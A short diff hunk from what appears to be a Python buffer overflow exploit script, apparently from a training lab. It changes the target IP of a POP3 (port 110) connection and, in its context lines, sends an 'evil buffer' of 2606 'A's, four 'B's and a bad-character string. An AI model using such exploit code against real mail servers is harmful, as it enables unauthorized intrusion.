@@ -24,7 +24,7 @@ buffer="A"*2606 + "B"*4 + badchars
 
 try:
   print "\nSending evil buffer..." 
-  s.connect(('10.0.0.22',110))
+  s.connect(('10.11.10.125',110))
   data = s.recv(1024)
   s.send('USER username' +'\r\n') 
   data = s.recv(1024)
